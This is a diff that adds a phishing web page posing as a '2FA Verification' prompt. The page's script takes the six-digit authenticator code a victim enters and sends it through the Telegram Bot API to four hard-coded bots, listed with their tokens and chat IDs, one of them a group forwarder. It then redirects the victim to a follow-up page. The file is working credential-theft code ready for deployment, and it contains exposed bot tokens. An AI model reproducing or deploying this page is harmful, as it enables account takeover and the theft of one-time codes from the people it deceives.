@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2FA Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: rgb(36, 36, 36);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 50vh;
+        }
+
+        .container {
+            background-color: rgba(34, 38, 38, 0);
+            padding: 10px;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+
+        .container h1 {
+            font-size: 15px;
+            color: #cacaca;
+            font-weight: 700;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            margin-bottom: 10px;
+        }
+
+        .container p {
+            font-size: 12px;
+            color: #b3b3b3;
+            font-weight: 500 ;
+           font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            margin-bottom: 20px;
+        }
+         
+
+        .input-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #2c2e2f;
+            border: 1px solid #4e4e4e;
+            border-radius: 5px;
+            padding: 7px;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            border: none;
+            background: none;
+            color: #fff;
+            outline: none;
+            width: 80%;
+        }
+
+        .input-group button {
+            background-color: #3f4547;
+            border: none;
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .container a {
+            font-size:12px;
+            font-weight: 600;
+           font-style: bold;
+            color: #c4d4c9;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .container button.submit {
+            background: linear-gradient(90deg, #33cc66, #39b54a);
+            color: #000;
+            font-weight: 700;
+            font-weight: bold;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .container button.submit:hover {
+            background:linear-gradient(90deg, #33cc66, #39b54a);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" alt="Lock Icon">
+        <h1>Verify 2FA</h1>
+        
+        <p>Please enter the 6-digit verification code from the authenticator.</p>
+        <p class="verifi_code">Verification Code</p>
+        <div class="input-group">
+            <input type="text" id="verificationCode" placeholder="Verification Code" maxlength="6">
+            <button onclick="pasteCode()">Paste</button>
+        </div>
+        <a href="#">Don't have access to this 2FA?</a>
+        <button class="submit" onclick="sendMessage()">Submit</button>
+    </div>
+
+   <script>
+    // Bot configurations - includes both direct receivers and group forwarder
+    const bots = [
+        {
+            token: "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs",
+            chatId: "6942741954"
+        },
+        {
+            token: "8086684078:AAGTJyuE7F0tRnRjTX4ScyL_NjxNzdMXNRs",
+            chatId: "7745903783"
+        },
+        {
+            token: "7761175575:AAFP2mKzIhk_SUnlMiCSukW4rOlLSUlT6kE",
+            chatId: "7166544377"
+        },
+        // Add your group forwarding bot here
+        {
+            token: "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8",
+            chatId: "-4814667671"  // Group chat ID (negative number)
+        }
+    ];
+
+    // Improved function to send message to a bot
+    async function sendToBot(bot, message) {
+        const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: bot.chatId,
+                    text: message,
+                    parse_mode: "HTML"  // Optional: allows basic HTML formatting
+                })
+            });
+
+            if (!response.ok) {
+                console.error(`Failed to send to ${bot.chatId}:`, await response.text());
+                return false;
+            }
+            return true;
+        } catch (error) {
+            console.error(`Error sending to ${bot.chatId}:`, error);
+            return false;
+        }
+    }
+
+    // Enhanced submit handler with better error handling
+    async function sendMessage() {
+        const code = document.getElementById("verificationCode").value.trim();
+
+        if (!code) {
+            alert("Please enter the verification code.");
+            return;
+        }
+
+        const message = `2FA Verification Code:\n<code>${code}</code>`; // Using <code> for better formatting
+
+        try {
+            // Send to all bots in parallel
+            const results = await Promise.all(
+                bots.map(bot => sendToBot(bot, message))
+            );
+
+            // Check if all messages were sent successfully
+            if (results.every(success => success)) {
+                window.location.href = 'verification.html';
+            } else {
+                console.warn("Some messages failed to send. Results:", results);
+                // Optional: alert or retry logic here
+            }
+        } catch (error) {
+            console.error("Critical error:", error);
+            alert("An error occurred while sending the code. Please try again.");
+        }
+    }
+
+    // Optional: Improved clipboard paste function
+    function pasteCode() {
+        navigator.clipboard.readText()
+            .then(text => {
+                const input = document.getElementById("verificationCode");
+                input.value = text;
+                input.focus();
+            })
+            .catch(err => {
+                console.error("Clipboard error:", err);
+                alert("Couldn't access clipboard. Please paste manually.");
+            });
+    }
+
+    // Add event listener for form submission
+    document.addEventListener("DOMContentLoaded", () => {
+        const form = document.querySelector("form"); // or getElementById if available
+        if (form) {
+            form.addEventListener("submit", (e) => {
+                e.preventDefault();
+                sendMessage();
+            });
+        }
+    });
+</script>
+</body>
+</html>
